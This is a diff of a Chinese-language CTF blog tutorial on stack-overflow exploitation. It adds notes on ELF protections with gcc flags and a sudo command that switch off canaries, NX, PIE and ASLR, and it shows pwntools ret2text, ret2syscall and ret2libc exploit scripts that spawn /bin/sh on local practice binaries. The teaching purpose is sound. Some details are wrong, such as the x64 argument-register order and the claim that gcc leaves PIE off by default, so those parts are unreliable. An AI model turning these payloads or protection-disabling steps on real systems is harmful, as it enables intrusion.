@@ -37,27 +37,27 @@
   <meta name="description" content="概述长期更新中…… pwn 是很接近底层的，经常会和汇编这些东西打交道，所以学习过程中不可避免会比较枯燥。pwn方向简单来说就是利用程序漏洞写脚本实施攻击取得权限并拿到flag（有时候sh不够需要提权），pwn手的乐趣也就这了。（拜托~，pwn掉系统什么的真的超帅的！）">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn の学习之路">
-<meta property="og:url" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/index.html">
+<meta property="og:url" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/index.html">
 <meta property="og:site_name" content="hacbit&#39;s blog">
 <meta property="og:description" content="概述长期更新中…… pwn 是很接近底层的，经常会和汇编这些东西打交道，所以学习过程中不可避免会比较枯燥。pwn方向简单来说就是利用程序漏洞写脚本实施攻击取得权限并拿到flag（有时候sh不够需要提权），pwn手的乐趣也就这了。（拜托~，pwn掉系统什么的真的超帅的！）">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/%E6%A0%88%E5%B8%A7.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/pip-error.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_main.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_stack.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_binsh.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2sys_main.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_vuln.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_rdi.png">
-<meta property="og:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_ret.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/%E6%A0%88%E5%B8%A7.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/pip-error.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_main.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_stack.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_binsh.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2sys_main.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_vuln.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_rdi.png">
+<meta property="og:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_ret.png">
 <meta property="article:published_time" content="2023-06-20T17:28:27.000Z">
-<meta property="article:modified_time" content="2023-08-02T06:42:15.760Z">
+<meta property="article:modified_time" content="2023-08-06T06:34:43.984Z">
 <meta property="article:author" content="hacbit">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png">
+<meta name="twitter:image" content="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png">
 
-<link rel="canonical" href="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">
+<link rel="canonical" href="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/">
 
 
 <script id="page-configurations">
@@ -220,7 +220,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://hacbit.tech/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">
+    <link itemprop="mainEntityOfPage" href="http://hacbit.tech/pwn%E6%96%B0%E6%89%8B%E6%9D%91/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -255,7 +255,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-08-02 14:42:15" itemprop="dateModified" datetime="2023-08-02T14:42:15+08:00">2023-08-02</time>
+                <time title="Modified: 2023-08-06 14:34:43" itemprop="dateModified" datetime="2023-08-06T14:34:43+08:00">2023-08-06</time>
               </span>
 
           
@@ -271,14 +271,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>5.3k</span>
+              <span>6.7k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>10 mins.</span>
+              <span>12 mins.</span>
             </span>
 
         </div>
@@ -310,14 +310,14 @@
 <p>而其中，栈溢出是最常见的漏洞，一般来说难度也比较小（也可以很恶心），作为pwn的起点当之无愧吧。</p>
 <h2 id="栈の基础"><a href="#栈の基础" class="headerlink" title="栈の基础"></a>栈の基础</h2><h3 id="什么是栈？（stack）"><a href="#什么是栈？（stack）" class="headerlink" title="什么是栈？（stack）"></a>什么是栈？（stack）</h3><p>栈是一种<strong>先进后出</strong>的数据结构，这也正好满足了调用函数的方式，即：父函数调用子函数，父在前，子在后；返回值时，子函数先返回，父函数后返回。</p>
 <p>对栈有push（压数据入栈），pop（弹出数据，并储存到指定寄存器或内存中）两种操作。</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/push_pop.png" alt="push&amp;pop"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png" alt="push&amp;pop"></p>
 <p><strong>需要注意:</strong> </p>
 <p>1）栈的生长是<strong>从高地址往低地址</strong>，对应上面演示的向下生长</p>
 <p>2）<strong>pop后被弹出的数据还在栈内，但是不能直接访问（还是可以访问的）</strong></p>
 <h3 id="什么是栈帧？（stack-frame）"><a href="#什么是栈帧？（stack-frame）" class="headerlink" title="什么是栈帧？（stack frame）"></a>什么是栈帧？（stack frame）</h3><p>其本质就是一种栈，这种栈专门来<strong>保存函数调用过程中的各种信息（参数，返回地址，本地变量等）。</strong></p>
 <p>栈帧有栈顶和栈底之分，<strong>栈顶地址最低，栈底地址最高，SP（栈指针）是一直指向栈顶的。</strong></p>
 <p>下面是一个栈帧示意图：</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/%E6%A0%88%E5%B8%A7.png" alt="栈帧"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/%E6%A0%88%E5%B8%A7.png" alt="栈帧"></p>
 <p>一般来说，<code>bp</code>（基址指针）到<code>sp</code>之间的区域当作栈帧。<strong>并不是整个栈空间只有一个栈帧，每调用一个函数，就会生成一个新的栈帧</strong>。</p>
 <p>函数调用过程中，我们将调用函数的函数称为 “调用者（caller）“， 被调用的函数称为 “被调用者（callee）”。其中：</p>
 <p>1）caller需要知道在哪里获取callee的返回值</p>
@@ -339,7 +339,7 @@
 <h2 id="pwntools基础"><a href="#pwntools基础" class="headerlink" title="pwntools基础"></a>pwntools基础</h2><h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>使用python自带的pip下载pwntools</p>
 <p><code>$ pip install pwntools</code></p>
 <p>如果在windows上的wsl上直接使用该语句可能会报错</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/pip-error.png" alt="pip_err"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/pip-error.png" alt="pip_err"></p>
 <p>不过好在给了你提示，只要在后面加上<code>--break-system-packages</code>即可</p>
 <p>也就是：<code>$ pip install pwntools --break-system-packages</code></p>
 <h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" title="pwntools使用"></a>pwntools使用</h3><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *	<span class="comment"># 导入pwntools模块</span></span><br></pre></td></tr></table></figure>
@@ -388,10 +388,72 @@
 
 
 
-<h2 id="babyROP"><a href="#babyROP" class="headerlink" title="babyROP"></a>babyROP</h2><h3 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h3><p>类似于比较常听到的OOP（面向对象编程），POP（面向过程编程），FP（函数式编程）等。</p>
+<h2 id="ELF文件保护机制"><a href="#ELF文件保护机制" class="headerlink" title="ELF文件保护机制"></a>ELF文件保护机制</h2><h3 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h3><p>canary是金丝雀的意思。技术上表示最先测试的（要是在软件或者其他什么东西看到canary版，大概率就是指测试版了）。这种叫法来自以前挖煤时，矿工们会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会有预警。所以大家就会用canary来搞最先的测试。在栈中，<strong>canary表示栈的报警保护。</strong></p>
+<p>canary的具体表现是在函数的栈底指针bp前添加一串随机数（不超过机器字长）（又叫cookie），末位是\x00，如果出现缓冲区溢出攻击，覆盖到canary处，并且导致改变该处数据后，<strong>当程序执行到此处（也就是当前函数要结束，准备跳转了），会检查canary值是否跟开始值一样，不一样会导致程序崩溃（应该会看到一串含有smashing的英文）</strong>，从而达到防止程序执行流被恶意控制的目的。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># canary示意图</span></span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">+-------------+ &lt;- </span><br><span class="line">|             | buffer</span><br><span class="line">|             |</span><br><span class="line">+-------------+</span><br><span class="line">|  canary     |</span><br><span class="line">+-------------+</span><br><span class="line">|    bp       |</span><br><span class="line">+-------------+</span><br><span class="line">|  ret addr   |</span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br></pre></td></tr></table></figure>
+
+<p><strong>gcc使用：</strong></p>
+<p><code>-fno-stack-protector / -fstack-protector / -fstack-protector-all</code> </p>
+<p><strong>（关闭 &#x2F; 部分开启 &#x2F; 全部开启）</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o filename filename.c	// 默认不开启canary</span><br><span class="line">gcc -o filename -fno-stack-protector filename.c	// 禁用canary</span><br><span class="line">gcc -o filename -fstack-protector filename.c	// 启用canary，不过只为局部变量中含有char数组的函数插入canary保护</span><br><span class="line">gcc -o filename -fstack-protector-all filename.c	// 启用canary，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h3><p>NX即No-eXecute（不可执行），NX（DEP）的表现为把数据所在内存页标识为不可执行，当程序溢出到shellcode时，程序会尝试执行指令，此时CPU会抛出异常，而不去执行恶意指令。</p>
+<p><strong>gcc使用：</strong></p>
+<p><code>-z execstack / -z noexecstack</code> </p>
+<p><strong>（关闭 &#x2F; 开启）</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c	// 默认开启NX</span><br><span class="line">gcc -o file -z execstack file.c	// 禁用NX</span><br><span class="line">gcc -o file -z noexecstack file.c	// 开启NX</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h3><p>一般情况下NX（DEP）和地址空间分布随机化（PIE &#x2F; ASLR）（address space layout randomization）会同时工作。内存地址随机化机制有三种情况：</p>
+<ul>
+<li>0 - 表示关闭进程地址空间随机化</li>
+<li>1 - 表示将mmap的基地址，栈基地址和.so地址随机化</li>
+<li>2 - 表示在1的基础上增加heap的地址随机化</li>
+</ul>
+<p><strong>该保护使每次运行的程序地址都不同，防止根据固定地址来写exp执行攻击。</strong>这可以防止ret2libc方式针对DEP的攻击。ASLR和DEP配合使用，可以有效阻止攻击者在堆栈上运行恶意代码。</p>
+<p><strong>linux下关闭PIE的命令如下：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s <span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+
+<p><strong>gcc用法：</strong></p>
+<p><code>-no-pie / -pie</code></p>
+<p><strong>（关闭 &#x2F; 开启）</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c	// 默认关闭PIE</span><br><span class="line">gcc -o file -fpie -pie file.c	// 开启PIE，强度为1</span><br><span class="line">gcc -o file -fPIE -pie file.c	// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -o file -fpic file.c	// 开启PIC，强度为1，不会开启PIE</span><br><span class="line">gcc -o file -fPIC file.c	// 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO（Relocation Read-Only）可以使程序某些部分标识为只读。分为两种情况：</p>
+<ul>
+<li><strong>Partial RELRO：</strong>是gcc的默认设置，几乎所有二进制文件都至少使用部分RELRO。这样仅能防止全局变量的缓冲区溢出导致覆盖GOT</li>
+<li><strong>Full RELRO：</strong>使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动前需要解析所有符号</li>
+</ul>
+<p><em>linux系统安全领域里，有w（write）权限的储存区就会是攻击的目标，尤其是储存函数指针的区域。所以在安全角度应该尽量减少可写的区域</em></p>
+<p><em>RELRO会设置符号重定向表格为只读或者程序启动时就解析并绑定所有动态符号，从而减少对GOT表的攻击。</em></p>
+<p><strong>可以简单理解为：</strong></p>
+<ul>
+<li><strong>Partial RELRO -&gt; .got不可写，got.plt（got表）可写</strong></li>
+<li><strong>Full RELRO -&gt; .got 和 got.plt 不可写</strong></li>
+</ul>
+<p><strong>gcc使用：</strong></p>
+<p><code>-z norelro / -z lazy / -z now</code></p>
+<p><strong>（关闭 &#x2F; 部分开启 &#x2F; 完全开启）</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o file file.c	// 默认为Partial RELRO</span><br><span class="line">gcc -o file -z norelro file.c	// 关闭，即No RELRO</span><br><span class="line">gcc -o file -z lazy file.c	// 部分开启，即Partial RELRO</span><br><span class="line">gcc -o file -z now file.c	// 完全开启，即Full RELRO</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><p>fortify是轻微的检查，用于检测是否存在缓冲区溢出的错误，适用于程序采用大量字符串或内存操作函数，如：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="是babyROP吧"><a href="#是babyROP吧" class="headerlink" title="是babyROP吧"></a>是babyROP吧</h2><p><strong>什么是ROP:</strong></p>
+<p>类似于比较常听到的OOP（面向对象编程），POP（面向过程编程），FP（函数式编程）等。</p>
 <p>ROP全称是Return-Oriented Programing（面向返回编程）。简单来说，<strong>ROP就是将源程序中散落的汇编程序片段（也称gadget）“拼接”在一起，使其能够为攻击者服务</strong>。 需要指出的是，此处的“拼接”不是指将这些汇编程序片段聚集在某个连续的内存空间中，而是让它们在逻辑上连续执行，也就是说构成一个”返回链“。ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
-<h3 id="为什么要ROP"><a href="#为什么要ROP" class="headerlink" title="为什么要ROP"></a>为什么要ROP</h3><p>ROP主要是为了绕过NX(DEP)保护。<strong>NX(DEP)基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode，程序会尝试在数据页面执行指令，此时CPU就会抛出异常，而不是执行恶意指令。</strong>NX开启后，直接往栈上或堆上注入代码的方式难以继续发挥效果，所以有了各种绕过方法，rop是其中一种。</p>
-<p>rop攻击一般要满足：</p>
+<p><strong>为什么要ROP:</strong></p>
+<p>ROP主要是为了绕过NX(DEP)保护。<strong>NX(DEP)基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode，程序会尝试在数据页面执行指令，此时CPU就会抛出异常，而不是执行恶意指令。</strong>NX开启后，直接往栈上或堆上注入代码的方式难以继续发挥效果，所以有了各种绕过方法，rop是其中一种。</p>
+<p><strong>rop攻击一般要满足：</strong></p>
 <p>1）程序存在溢出，并且可以控制返回地址。</p>
 <p>2）可以找到满足条件的gadget以及对应的gadget地址（如果gadget每次地址是不固定的，就要想办法动态获取对应地址了）</p>
 <h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>ret2text（ret to text）实际上就是一种ROP，只不过只返回一次而已（返回到text上），ret2text本质就是控制ret返回到已有的代码上如：system(“&#x2F;bin&#x2F;sh”)， execv(“&#x2F;bin&#x2F;sh”)，从而getshell。</p>
@@ -403,9 +465,9 @@
 <p><code>gcc -o pwn -fno-stack-protector -no-pie pwn.c</code></p>
 <p>scanf处没有对读取数据长度做检测，存在溢出</p>
 <p>不过直接说可能不好理解，看一下ida吧</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_main.png" alt="main"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_main.png" alt="main"></p>
 <p>栈空间：</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_stack.png" alt="stack"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_stack.png" alt="stack"></p>
 <p>显然这里输入到了v4(对应到栈里面的var_30)，发现跟预想的0x20不一样，偷偷加了一些空间，而且多创建了一个不知道干什么的int变量。使用实际要填充的长度应该是</p>
 <p><code>offset = 0x2c + 0x4 + 0x8 = 0x38</code></p>
 <p>这里的0x2c是var_30的大小（可以看到左边一列数那里0x30和4相差了0x2c（不是26嗷））；</p>
@@ -413,7 +475,7 @@
 <p>然后后面的8个字节是rbp（i386就是4个字节（ebp）），可以看到s和r那里相差了8；</p>
 <p>然后再覆盖新的返回地址（如果有后门函数就返回到那里就好了）</p>
 <p>再一眼后门函数</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2text_binsh.png" alt="binsh"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2text_binsh.png" alt="binsh"></p>
 <p>发现&#x2F;bin&#x2F;sh字符串在0x401144传参，所以就返回到0x401144，于是写出exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(<span class="number">0x401144</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -439,7 +501,7 @@
 <p>看一道例题：<a href="../resources/pwn_asset/study/ret2sys_64" target="_blank">ret2sys_64</a></p>
 </li>
 </ul>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2sys_main.png" alt="main"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2sys_main.png" alt="main"></p>
 <p>程序里面没有现成的&#x2F;bin&#x2F;sh，所以可以用两次系统调用，一次读字符串，一次拿sh</p>
 <p>exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./ret2sys_64&#x27;</span>)</span><br><span class="line">rax = <span class="number">0x46b9f8</span></span><br><span class="line">rdi = <span class="number">0x4016c3</span></span><br><span class="line">rdx_rsi = <span class="number">0x4377f9</span></span><br><span class="line">syscall = <span class="number">0x45bac5</span></span><br><span class="line">bss = <span class="number">0x6c1c60</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span></span><br><span class="line"><span class="comment"># 调用sys_read，用来读取后面输入的/bin/sh到bss段</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0x10</span>) + p64(bss) + p64(syscall)</span><br><span class="line"><span class="comment"># 调用execve来getshell</span></span><br><span class="line">payload += p64(rax) + p64(<span class="number">0x3b</span>) + p64(rdi) + p64(bss)</span><br><span class="line">payload += p64(rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;system_x64&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
@@ -451,17 +513,17 @@
 <p>ret2libc的思路是寻找程序中的gadget构造ROP，来调用程序中的输出函数如：puts，write，打印一些函数的地址，从而达到泄露基地址的目的</p>
 <p><strong>例题：</strong><a href="../resources/pwn_asset/study/ret2libc_x64" target="_block">MoeCTF2022_ret2libc</a></p>
 <p>在vuln函数里面就是一个简单的栈溢出，溢出长度足够构造ROP</p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_vuln.png" alt="vuln"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_vuln.png" alt="vuln"></p>
 <p>覆盖的长度为0x40+0x8（rbp）&#x3D;0x48</p>
 <p>然后由于x64前六个参数用寄存器传，多的才是和x86一样栈传参，这前六个参数依次用rdi，rsi，rcx，rdx，r8，r9寄存器</p>
 <p>这里我们目的是通过puts函数来输出puts的got表中的地址来泄露puts的真实地址。</p>
 <p>所以要把puts_got作为参数传进puts函数里，也就是要用到rdi寄存器。<strong>（找gadget可以用ROPgadget）</strong></p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_rdi.png" alt="findrdi"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_rdi.png" alt="findrdi"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi = <span class="number">0x40117e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># .got指向函数在libc的真实地址</span></span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) <span class="comment"># 也可以elf.sym[&#x27;puts&#x27;]，因为.plt存的就是函数的符号信息</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># 也可以填vuln函数地址，只要保证再用一次read就行</span></span><br></pre></td></tr></table></figure>
 
 <p>然后接收打印的地址，在查找libc版本，然后计算system，字符串&#x2F;bin&#x2F;sh的地址，就可以构造第二个payload</p>
 <p><strong>要注意：ubuntu18以上版本调用系统函数要栈对齐，一般在传参前加个ret的gadget就行</strong></p>
-<p><img src="/pwn-%E3%81%AE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/ret2libc_ret.png" alt="findret"></p>
+<p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/ret2libc_ret.png" alt="findret"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> u64(ru(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) <span class="comment"># 这么写是因为一般以\x7f结尾的6个字节</span></span><br><span class="line"></span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">libc = get_libc(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">如果是给了你libc文件，本地加载时用ELF()就行，用法自然跟上面LibcSearcher的不一样</span></span><br><span class="line"><span class="string">example:</span></span><br><span class="line"><span class="string">	libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"><span class="string">	libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">	sys_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">	binsh_addr = libc_base + libc.search(b&#x27;/bin/sh&#x27;).__next__() @py3</span></span><br><span class="line"><span class="string">							#libc.search(&#x27;/bin/sh&#x27;).next() @py2</span></span><br><span class="line"><span class="string">	py3中search()的参数必须是bytes，然后next方法多了下划线</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(ret) + p64(rdi) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br></pre></td></tr></table></figure>
 
